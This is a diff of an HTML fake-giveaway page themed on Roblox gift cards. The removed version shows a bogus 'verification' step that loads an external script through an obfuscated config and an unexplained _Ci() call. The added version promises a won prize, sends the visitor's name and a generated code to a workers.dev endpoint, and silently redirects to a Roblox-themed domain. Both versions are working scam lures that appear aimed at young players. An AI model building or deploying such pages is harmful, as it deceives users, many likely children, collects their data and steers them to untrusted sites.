@@ -3,576 +3,272 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Win a Roblox Gift Card!</title>
 
-<script type="text/javascript">
-var yqeuZ_VJF_srcnjc = {
-  "it": 4480746,
-  "key": "56000"
-};
-</script>
-
-<script src="https://d18k3i06xdslhs.cloudfront.net/d22a2bb.js"></script>
+<title>Congratulations! You Won</title>
 
 <style>
 *{
-  margin:0;
-  padding:0;
   box-sizing:border-box;
 }
 
 body{
-  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
-  background-color:#1a1a2e;
-  color:#ffffff;
+  margin:0;
   min-height:100vh;
   display:flex;
-  justify-content:center;
   align-items:center;
-  padding:20px;
-}
-
-.container{
-  max-width:600px;
-  width:100%;
-  background-color:#16213e;
-  border-radius:20px;
-  padding:40px;
-  box-shadow:0 20px 60px rgba(0,0,0,.5);
-  text-align:center;
-  position:relative;
-  overflow:hidden;
-}
-
-.container::before{
-  content:'';
-  position:absolute;
-  top:-50%;
-  left:-50%;
-  width:200%;
-  height:200%;
+  justify-content:center;
+  padding:24px;
+  font-family:Tahoma,Arial,sans-serif;
   background:radial-gradient(
-    circle,
-    rgba(0,168,255,.1) 0%,
-    transparent 70%
+    circle at top,
+    #294fb2 0%,
+    #142d76 42%,
+    #071642 100%
   );
-  animation:pulse 4s ease-in-out infinite;
+  color:#fff;
 }
 
-@keyframes pulse{
-  0%,100%{
-    transform:scale(1);
-    opacity:.5;
-  }
-
-  50%{
-    transform:scale(1.1);
-    opacity:.8;
-  }
+.card{
+  width:100%;
+  max-width:430px;
+  padding:34px 24px 28px;
+  text-align:center;
+  border:1px solid rgba(120,175,255,.35);
+  border-radius:28px;
+  background:linear-gradient(
+    180deg,
+    rgba(19,48,119,.96),
+    rgba(9,31,82,.98)
+  );
+  box-shadow:0 20px 60px rgba(0,0,0,.35);
 }
 
-.emoji-title{
-  font-size:3rem;
-  margin-bottom:10px;
-  position:relative;
-  z-index:1;
+.icon{
+  width:100px;
+  height:100px;
+  margin:0 auto 24px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:55px;
 }
 
 h1{
-  font-size:2rem;
-  color:#00d9ff;
-  margin-bottom:10px;
-  text-shadow:0 0 20px rgba(0,217,255,.5);
-  position:relative;
-  z-index:1;
-  text-align:center;
+  margin:0 0 14px;
+  font-size:28px;
+  background:linear-gradient(90deg,#23d8ff,#8c5cff);
+  -webkit-background-clip:text;
+  background-clip:text;
+  color:transparent;
 }
 
-.subtitle{
-  font-size:1.2rem;
-  color:#a0d2eb;
-  margin-bottom:30px;
-  position:relative;
-  z-index:1;
-  text-align:center;
-}
-
-.card-preview{
-  background-color:#0f3460;
-  border-radius:15px;
-  padding:25px;
-  margin:25px 0;
-  border:2px solid #00d9ff;
-  position:relative;
-  z-index:1;
-  text-align:center;
-}
-
-.card-preview h3{
-  color:#00d9ff;
-  font-size:1.3rem;
-  margin-bottom:15px;
-  text-align:center;
-}
-
-.card-preview p{
-  color:#e0e0e0;
+.desc{
+  margin:0 auto 24px;
+  color:#e8efff;
   line-height:1.6;
-  margin-bottom:10px;
-  text-align:center;
 }
 
-.steps{
-  text-align:left;
-  margin:25px 0;
-  position:relative;
-  z-index:1;
-}
-
-.steps h2{
-  color:#00d9ff;
-  font-size:1.4rem;
-  margin-bottom:15px;
-  text-align:center;
-}
-
-.step{
-  display:flex;
-  align-items:flex-start;
-  margin-bottom:15px;
+input{
+  width:100%;
   padding:15px;
-  background-color:#0f3460;
-  border-radius:10px;
-  transition:transform .3s ease;
+  margin-bottom:15px;
+  border:1px solid rgba(120,175,255,.4);
+  border-radius:12px;
+  background:rgba(0,0,0,.2);
+  color:#fff;
+  font-size:16px;
+  outline:none;
 }
 
-.step:hover{
-  transform:translateX(5px);
-  background-color:#1a4a7a;
+input::placeholder{
+  color:#a8bfff;
 }
 
-.step-number{
-  background-color:#00d9ff;
-  color:#16213e;
-  width:30px;
-  height:30px;
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-weight:bold;
-  margin-right:15px;
-  flex-shrink:0;
-}
-
-.step-text{
-  color:#e0e0e0;
-  line-height:1.5;
-}
-
-.prize-section{
-  background-color:#0f3460;
-  border-radius:15px;
-  padding:25px;
-  margin:25px 0;
-  border:2px solid #ffd700;
-  position:relative;
-  z-index:1;
-  text-align:center;
-}
-
-.prize-section h2{
-  color:#ffd700;
-  font-size:1.5rem;
-  margin-bottom:10px;
-  text-align:center;
-}
-
-.prize-section .gift-emoji{
-  font-size:4rem;
-  margin:15px 0;
-  text-align:center;
-}
-
-.prize-name{
-  font-size:1.3rem;
-  color:#ffffff;
-  font-weight:bold;
-  margin-bottom:10px;
-  text-align:center;
-}
-
-.prize-section p{
-  text-align:center;
-  color:#e0e0e0;
-}
-
-.urgency{
-  color:#ff6b6b !important;
-  font-weight:bold;
-  margin:10px 0;
-  text-align:center;
-}
-
-.enter-btn{
-  display:block;
-  margin:20px auto 0 auto;
-  background-color:#00d9ff;
-  color:#16213e;
-  font-size:1.3rem;
-  font-weight:bold;
-  padding:18px 50px;
-  border-radius:50px;
-  text-decoration:none;
-  transition:all .3s ease;
-  box-shadow:0 0 30px rgba(0,217,255,.4);
-  position:relative;
-  z-index:1;
-  border:none;
+.send-btn{
+  width:100%;
+  padding:17px;
+  border:0;
+  border-radius:16px;
+  color:white;
+  font-size:19px;
+  font-weight:700;
+  background:linear-gradient(90deg,#168cff,#6c48ed);
   cursor:pointer;
-  text-align:center;
 }
 
-.enter-btn:hover{
-  background-color:#00a8ff;
-  transform:scale(1.05);
-  box-shadow:0 0 40px rgba(0,217,255,.6);
+.send-btn:disabled{
+  opacity:.6;
+  cursor:not-allowed;
 }
 
-.enter-btn:active{
-  transform:scale(.98);
-}
-
-.disclaimer{
-  margin-top:25px;
-  font-size:.85rem;
-  color:#888;
-  position:relative;
-  z-index:1;
-  text-align:center;
-  line-height:1.5;
-}
-
-.floating-emoji{
-  position:absolute;
-  font-size:2rem;
-  animation:float 6s ease-in-out infinite;
-  opacity:.3;
-  pointer-events:none;
-}
-
-@keyframes float{
-  0%,100%{
-    transform:translateY(0) rotate(0deg);
-  }
-
-  50%{
-    transform:translateY(-20px) rotate(10deg);
-  }
-}
-
-.emoji-1{
-  top:10%;
-  left:10%;
-}
-
-.emoji-2{
-  top:20%;
-  right:10%;
-  animation-delay:1s;
-}
-
-.emoji-3{
-  bottom:20%;
-  left:15%;
-  animation-delay:2s;
-}
-
-.emoji-4{
-  bottom:10%;
-  right:15%;
-  animation-delay:3s;
-}
-
-/* STEP 2 */
-
-#verificationStep{
-  display:none;
-  position:relative;
-  z-index:2;
-  text-align:center;
-  animation:stepIn .5s ease;
-}
-
-@keyframes stepIn{
-  from{
-    opacity:0;
-    transform:translateY(20px);
-  }
-
-  to{
-    opacity:1;
-    transform:translateY(0);
-  }
-}
-
-.verification-icon{
-  font-size:4rem;
-  margin:15px auto;
-  text-align:center;
-}
-
-.verification-text{
-  color:#e0e0e0;
-  line-height:1.7;
-  margin:0 auto 10px auto;
-  text-align:center;
-  max-width:480px;
-}
-
-.verification-note{
-  color:#a0d2eb;
-  font-size:.9rem;
-  margin:12px auto 0 auto;
-  text-align:center;
-  max-width:450px;
-}
-
-/* Mobile */
-
-@media(max-width:480px){
-
-  body{
-    padding:12px;
-  }
-
-  .container{
-    padding:25px 18px;
-  }
-
-  h1{
-    font-size:1.5rem;
-    text-align:center;
-  }
-
-  .subtitle{
-    font-size:1rem;
-    text-align:center;
-  }
-
-  .card-preview,
-  .prize-section{
-    padding:22px 15px;
-    text-align:center;
-  }
-
-  .card-preview h3{
-    font-size:1.15rem;
-    text-align:center;
-    line-height:1.4;
-  }
-
-  .card-preview p{
-    text-align:center;
-  }
-
-  .verification-icon{
-    font-size:3.5rem;
-  }
-
-  .verification-text{
-    font-size:1rem;
-    text-align:center;
-  }
-
-  .verification-note{
-    text-align:center;
-  }
-
-  .prize-section h2{
-    text-align:center;
-  }
-
-  .prize-name{
-    text-align:center;
-  }
-
-  .enter-btn{
-    font-size:1.05rem;
-    padding:16px 30px;
-    margin-left:auto;
-    margin-right:auto;
-  }
-
-  .disclaimer{
-    text-align:center;
-  }
+#msg{
+  margin-top:15px;
+  font-weight:bold;
+  min-height:22px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<main class="card">
 
-  <div class="floating-emoji emoji-1">🎮</div>
-  <div class="floating-emoji emoji-2">🎁</div>
-  <div class="floating-emoji emoji-3">🎯</div>
-  <div class="floating-emoji emoji-4">⭐</div>
+  <div class="icon">🎁</div>
 
-  <div class="emoji-title">🎮</div>
+  <h1>Congratulations! You Won!</h1>
 
-  <h1>WIN A ROBLOX GIFT CARD!</h1>
-
-  <p class="subtitle">
-    Your Chance to Get Roblox Rewards 🎁
+  <p class="desc">
+    Enter your name and click the button to claim your prize.
   </p>
 
-  <!-- STEP 1 -->
-  <div id="step1">
+  <form id="f">
 
-    <div class="card-preview">
-      <h3>🚀 Ready to level up your Roblox experience?</h3>
+    <input
+      type="text"
+      id="name"
+      placeholder="Enter your name"
+      maxlength="50"
+      required
+    >
 
-      <p>
-        Enter our giveaway for a chance to win a
-        <strong>Roblox Gift Card</strong>!
-      </p>
-    </div>
+    <button class="send-btn" id="sendBtn" type="submit">
+      📤 Claim My Prize
+    </button>
 
-    <div class="steps">
+  </form>
 
-      <h2>🚀 How It Works</h2>
+  <p id="msg"></p>
 
-      <div class="step">
-        <div class="step-number">1</div>
-        <div class="step-text">
-          Click the <strong>ENTER GIVEAWAY</strong> button.
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-number">2</div>
-        <div class="step-text">
-          Follow the verification step shown next.
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-number">3</div>
-        <div class="step-text">
-          Complete your entry.
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-number">4</div>
-        <div class="step-text">
-          Winners are selected according to the giveaway rules.
-        </div>
-      </div>
-
-    </div>
-
-    <div class="prize-section">
-
-      <h2>🎁 GIVEAWAY ENTRY</h2>
-
-      <div class="gift-emoji">🎁</div>
-
-      <div class="prize-name">
-        Roblox Gift Card Prize
-      </div>
-
-      <p>Limited entries available.</p>
-
-      <p class="urgency">
-        Enter now for your chance to win!
-      </p>
-
-      <button
-        type="button"
-        class="enter-btn"
-        onclick="showVerification()">
-        👉 ENTER GIVEAWAY
-      </button>
-
-    </div>
-
-  </div>
-
-  <!-- STEP 2 -->
-  <div id="verificationStep">
-
-    <div class="card-preview">
-
-      <h3>🔐 Complete Your Verification</h3>
-
-      <div class="verification-icon">
-        🤖
-      </div>
-
-      <div class="prize-name">
-        Verify to Continue
-      </div>
-
-      <p class="verification-text">
-        Complete the verification below to continue with your giveaway entry.
-      </p>
-
-      <p class="verification-note">
-        This step helps process your giveaway entry.
-      </p>
-
-    </div>
-
-    <div class="prize-section">
-
-      <h2>✅ VERIFICATION</h2>
-
-      <div class="gift-emoji">
-        🎯
-      </div>
-
-      <div class="prize-name">
-        Ready to Continue?
-      </div>
-
-      <p>
-        Click the button below to start the verification.
-      </p>
-
-      <button
-        type="button"
-        class="enter-btn"
-        onclick="_Ci()">
-        ✅ VERIFY NOW
-      </button>
-
-    </div>
-
-  </div>
-
-  <p class="disclaimer">
-    This giveaway is not affiliated with or sponsored by Roblox Corporation.
-    Roblox is a registered trademark of Roblox Corporation.
-  </p>
-
-</div>
+</main>
 
 <script>
-function showVerification(){
 
-  document.getElementById("step1").style.display="none";
+const WORKER_URL =
+"https://tilgram-sand.aamirkhoya.workers.dev/";
 
-  document.getElementById("verificationStep").style.display="block";
+const REDIRECT_URL =
+"https://www.rob40.pro/";
 
-  window.scrollTo({
-    top:0,
-    behavior:"smooth"
-  });
-
+/*
+  If the form was already submitted during this browser session,
+  don't show the form again.
+*/
+if(sessionStorage.getItem("prize_submitted") === "1"){
+  window.location.replace(REDIRECT_URL);
 }
+
+/* Generate random code */
+function generateCode(length = 8){
+
+  const characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+  let result = "";
+
+  for(let i = 0; i < length; i++){
+
+    result += characters.charAt(
+      Math.floor(Math.random() * characters.length)
+    );
+
+  }
+
+  return result;
+}
+
+document.getElementById("f").addEventListener(
+  "submit",
+  async function(e){
+
+    e.preventDefault();
+
+    const name =
+      document.getElementById("name").value.trim();
+
+    const msg =
+      document.getElementById("msg");
+
+    const button =
+      document.getElementById("sendBtn");
+
+    if(!name){
+      return;
+    }
+
+    const secretCode = generateCode(8);
+
+    msg.innerText = "Processing...";
+    msg.style.color = "#ffffff";
+
+    button.disabled = true;
+
+    try{
+
+      const response = await fetch(WORKER_URL,{
+
+        method:"POST",
+
+        headers:{
+          "Content-Type":"application/json"
+        },
+
+        body:JSON.stringify({
+
+          username:name,
+
+          code:secretCode,
+
+          page:"Prize",
+
+          time:new Date().toISOString()
+
+        })
+
+      });
+
+      if(!response.ok){
+        throw new Error("Request failed");
+      }
+
+      /*
+        Mark this session as completed.
+      */
+      sessionStorage.setItem(
+        "prize_submitted",
+        "1"
+      );
+
+      msg.innerText =
+        "✅ Submitted successfully!";
+
+      msg.style.color = "#4ade80";
+
+      /*
+        Redirect without adding this page
+        to browser history.
+      */
+      setTimeout(() => {
+
+        window.location.replace(
+          REDIRECT_URL
+        );
+
+      }, 1000);
+
+    }catch(error){
+
+      msg.innerText =
+        "❌ Something went wrong. Please try again.";
+
+      msg.style.color = "#f87171";
+
+      button.disabled = false;
+
+    }
+
+  }
+);
+
 </script>
 
 </body>
